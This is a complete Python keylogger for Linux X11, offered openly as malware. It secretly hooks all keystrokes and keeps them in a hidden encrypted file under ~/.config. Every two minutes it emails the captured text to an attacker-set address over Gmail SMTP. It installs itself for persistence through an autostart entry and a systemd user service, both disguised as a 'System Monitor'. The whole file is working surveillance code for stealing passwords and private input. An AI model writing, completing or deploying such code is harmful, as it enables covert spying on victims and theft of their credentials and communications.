#!/usr/bin/python
'''
Description: The keylogger secretly captures keyboard input on Linux X11 systems and reports it via email.

Requirements:
You need to install pyxhook ,cryptography and python-xlib (pip install python-xlib pyxhook cryptography). Otherwise, the script won't work.

Usage:
python Keylogger_lin_final.py

IMPORTANT:
The script is designed to be run as a standalone executable using PyInstaller or similar tools

Summary:
- Runs silently in the background
- Must be run in X11 session (not Wayland)
- Creates encrypted log in ~/.config folder
- Emails captured keystrokes every 2 minutes
- Sets up persistence through systemd and autostart

'''

import smtplib
import threading
import os
import time
import sys
from cryptography.fernet import Fernet
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import pyxhook

home_dir = os.path.expanduser("~")
config_dir = os.path.join(home_dir, ".config")
if not os.path.exists(config_dir):
    os.makedirs(config_dir, exist_ok=True)
log_file = os.path.join(config_dir, ".system_log.dat") #Log file path

text = "" #Global keystroke buffer
is_initializing = True #Initialization flag
encryption_key = None #Memory-only key storage

MAIL_SERVER = 'smtp.gmail.com' #Email configuration
MAIL_PORT = 587
MAIL_USER = "ENTER YOUR EMAIL HERE" #Sender email address
MAIL_PASS = "ENTER YOUR PASSWORD HERE" #Note: Use an app password for Gmail if 2FA is enabled
RECIPIENT_EMAIL = "ENTER DESTINATION EMAIL HERE" #Recipient email address (can be the same as sender)
time_interval = 120 #Email interval in seconds

def log_message(message):
    global text
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"\n[SYSTEM {timestamp}] {message}\n"
    print(log_entry) #Console output
    text += log_entry #Add to buffer
    if not is_initializing:
        save_logs()

def generate_key():
    global encryption_key
    if encryption_key is None:
        password = b"ENTER PASSWORD" #Encryption password
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        encryption_key = {'salt': salt, 'key': key}
        return key
    return encryption_key['key']

def get_cipher():
    key = generate_key()
    return Fernet(key)

def save_logs():
    global text
    if text:
        cipher = get_cipher()
        existing_data = b""
        if os.path.exists(log_file):
            try:
                with open(log_file, 'rb') as f:
                    encrypted_data = f.read()
                    if encrypted_data:
                        existing_data = cipher.decrypt(encrypted_data)
            except Exception as e:
                print(f"Error decrypting logs: {e}")
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S") + ": "
        combined_data = existing_data + timestamp.encode() + text.encode() + b"\n\n"
        encrypted_data = cipher.encrypt(combined_data)
        with open(log_file, 'wb') as f:
            f.write(encrypted_data)

def read_logs():
    try:
        if os.path.exists(log_file):
            cipher = get_cipher()
            with open(log_file, 'rb') as f:
                encrypted_data = f.read()
                if encrypted_data:
                    decrypted_data = cipher.decrypt(encrypted_data)
                    return decrypted_data.decode('utf-8', errors='replace')
    except Exception as e:
        print(f"Error reading logs: {e}")
    return "No logs available"

def setup_persistence():
    try:
        if getattr(sys, 'frozen', False): #PyInstaller executable
            app_path = sys.executable
        else: #Python script
            app_path = os.path.abspath(__file__)
            app_path = f"python3 {app_path}"
        
        autostart_dir = os.path.join(home_dir, ".config", "autostart")
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir, exist_ok=True)
        
        desktop_file = os.path.join(autostart_dir, "system-monitor.desktop")
        with open(desktop_file, "w") as f:
            f.write(f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec={app_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
X-GNOME-WMName=X11
Comment=Linux system monitoring service
StartupNotify=false
Terminal=false
""")
        os.chmod(desktop_file, 0o755)
        
        try: #Systemd service setup
            service_content = f"""[Unit]
Description=System Monitoring Service
After=graphical-session.target

[Service]
Type=simple
ExecStart={app_path}
Restart=on-failure
RestartSec=5
Environment=DISPLAY=:0

[Install]
WantedBy=default.target
"""
            systemd_dir = os.path.join(home_dir, ".config", "systemd", "user")
            if not os.path.exists(systemd_dir):
                os.makedirs(systemd_dir, exist_ok=True)
                
            service_path = os.path.join(systemd_dir, "system-monitor.service")
            with open(service_path, "w") as f:
                f.write(service_content)
                
            os.system("systemctl --user daemon-reload")
            os.system("systemctl --user enable system-monitor.service")
            os.system("systemctl --user start system-monitor.service")
            
            log_message("Systemd service created and enabled")
        except Exception as e:
            log_message(f"Systemd service setup error: {e}")
            
        log_message("Persistence setup successful")
        return True
    except Exception as e:
        log_message(f"Persistence error: {e}")
        return False

def send_email():
    global text
    try:
        save_logs() #Save before sending
        msg = MIMEMultipart()
        msg['From'] = MAIL_USER
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = f"System Report - {time.strftime('%Y-%m-%d %H:%M:%S')}"
        
        if text:
            msg.attach(MIMEText(f"Recent Keystrokes:\n\n{text}", 'plain'))
        else:
            msg.attach(MIMEText("No new keystrokes captured.", 'plain'))
        
        full_logs = read_logs()
        if full_logs:
            log_attachment = MIMEText(full_logs, 'plain')
            log_attachment.add_header('Content-Disposition', 'attachment', filename='full_logs.txt')
            msg.attach(log_attachment)
            
        server = smtplib.SMTP(MAIL_SERVER, MAIL_PORT)
        server.starttls()
        server.login(MAIL_USER, MAIL_PASS)
        server.sendmail(MAIL_USER, RECIPIENT_EMAIL, msg.as_string())
        server.quit()

        log_message("Email sent successfully")
        text = "" #Clear buffer after sending
            
    except Exception as e:
        log_message(f"Email error: {e}")

    timer = threading.Timer(time_interval, send_email) #Schedule next email
    timer.daemon = True
    timer.start()

def on_key_press(event):
    global text
    #print(f"DEBUG: Key pressed: {event.Key}")
    try:
        if event.Key == "Return":
            text += "\n"
        elif event.Key == "Tab":
            text += "\t"
        elif event.Key == "space":
            text += " "
        elif event.Key == "BackSpace" and len(text) > 0:
            text = text[:-1]
        elif event.Key in ["Shift_L", "Shift_R", "Control_L", "Control_R", "Alt_L", "Alt_R"]:
            pass
        elif event.Key == "Escape":
            pass
        elif len(event.Key) == 1: #Single character
            text += event.Key
        elif len(event.Key) > 1: #Special key
            special_keys = {
                "period": ".", "comma": ",", "slash": "/", "backslash": "\\",
                "bracketleft": "[", "bracketright": "]", "equal": "=", "minus": "-",
            }
            if event.Key in special_keys:
                text += special_keys[event.Key]
    except Exception as e:
        log_message(f"Keylogging error: {e}")
    return True

def main():
    global is_initializing
    print("Keylogger starting")
    setup_persistence()
    
    hook_manager = pyxhook.HookManager() #Setup keyboard hook
    hook_manager.KeyDown = on_key_press
    hook_manager.HookKeyboard()
    
    try:
        hook_manager.start()
        print("Keyboard hook started successfully")
    except Exception as e:
        print(f"ERROR starting keyboard hook: {e}")
        sys.exit(1)
    
    is_initializing = False
    log_message("Initialization complete")
    
    send_email()
    log_message("Email timer initiated")
    
    try: #Main loop
        while True:
            time.sleep(300) #Reduce CPU usage
            save_logs() #Periodic save
    except KeyboardInterrupt:
        log_message("Keylogger terminated by keyboard interrupt")
        hook_manager.cancel()
    except Exception as e:
        log_message(f"Unexpected error in main loop: {e}")

if __name__ == "__main__":
    main()